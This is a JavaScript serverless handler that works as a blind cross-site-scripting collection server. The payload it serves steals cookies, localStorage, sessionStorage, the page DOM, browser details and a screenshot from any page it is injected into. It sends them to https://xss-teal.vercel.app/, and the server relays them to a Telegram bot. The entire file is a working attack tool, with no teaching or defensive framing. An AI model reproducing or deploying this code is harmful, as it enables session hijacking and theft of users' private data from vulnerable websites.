export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    await sendTelegram(data);
    return res.status(200).json({ status: 'received' });
  }
  
  if (req.method === 'GET' && req.query && Object.keys(req.query).length > 0) {
    const encodedData = Object.keys(req.query)[0];
    try {
      const data = JSON.parse(Buffer.from(encodedData, 'base64').toString());
      await sendTelegram(data);
    } catch(e) {}
    
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    return res.send(pixel);
  }
  
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  const payload = `
var data = {};

function safe(val) {
  return val !== undefined ? val : "";
}

function sendData(payload) {
  if (location.protocol === 'file:') {
    var img = new Image();
    img.src = 'https://xss-teal.vercel.app/?' + btoa(JSON.stringify(payload));
  } else {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://xss-teal.vercel.app/", true);
    xhr.setRequestHeader("Content-type", "text/plain");
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status) {}
    };
    xhr.send(JSON.stringify(payload));
  }
}

function takeScreenshot() {
  try {
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    // Try html2canvas if available
    if (typeof html2canvas !== 'undefined') {
      html2canvas(document.body).then(function(canvas) {
        data.screenshot = canvas.toDataURL('image/png');
        finalize();
      });
    } else {
      data.screenshot = "";
      finalize();
    }
  } catch(e) {
    data.screenshot = "";
    finalize();
  }
}

function collectData() {
  try { data.uri = safe(location.toString()); } catch(e) { data.uri = ""; }
  try { data.cookies = safe(document.cookie); } catch(e) { data.cookies = ""; }
  try { data.referrer = safe(document.referrer); } catch(e) { data.referrer = ""; }
  try { data["user-agent"] = safe(navigator.userAgent); } catch(e) { data["user-agent"] = ""; }
  try { data.origin = safe(location.origin); } catch(e) { data.origin = ""; }
  try { 
    var lang = navigator.language || navigator.userLanguage;
    data.lang = safe(lang);
  } catch(e) { data.lang = ""; }
  
  try {
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    var gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    data.gpu = safe(gpu);
  } catch(e) { data.gpu = ""; }
  
  try { data.localstorage = window.localStorage; } catch(e) { data.localstorage = ""; }
  try { data.sessionstorage = window.sessionStorage; } catch(e) { data.sessionstorage = ""; }
  try { data.dom = safe(document.documentElement.outerHTML); } catch(e) { data.dom = ""; }
  
  takeScreenshot();
}

function finalize() {
  sendData(data);
}

function addListener(element, event, handler) {
  if (element.addEventListener) {
    element.addEventListener(event, handler, false);
  } else if (element.attachEvent) {
    element.attachEvent("on" + event, handler);
  }
}

if (document.readyState === "complete") {
  collectData();
} else {
  addListener(window, "load", function() {
    collectData();
  });
}
`;
  
  res.send(payload);
}

async function sendTelegram(data) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  let message = `🚨 XSS Payload Executed
URI: ${data.uri}
Origin: ${data.origin}
Cookies: ${data.cookies}
Referrer: ${data.referrer}
User-Agent: ${data['user-agent']}
Language: ${data.lang}
GPU: ${data.gpu}
LocalStorage: ${JSON.stringify(data.localstorage)}
SessionStorage: ${JSON.stringify(data.sessionstorage)}
DOM Length: ${data.dom?.length || 0} chars`;

  if (data.screenshot && data.screenshot.length > 0) {
    message += `\nScreenshot: Available`;
  }
  
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });
}

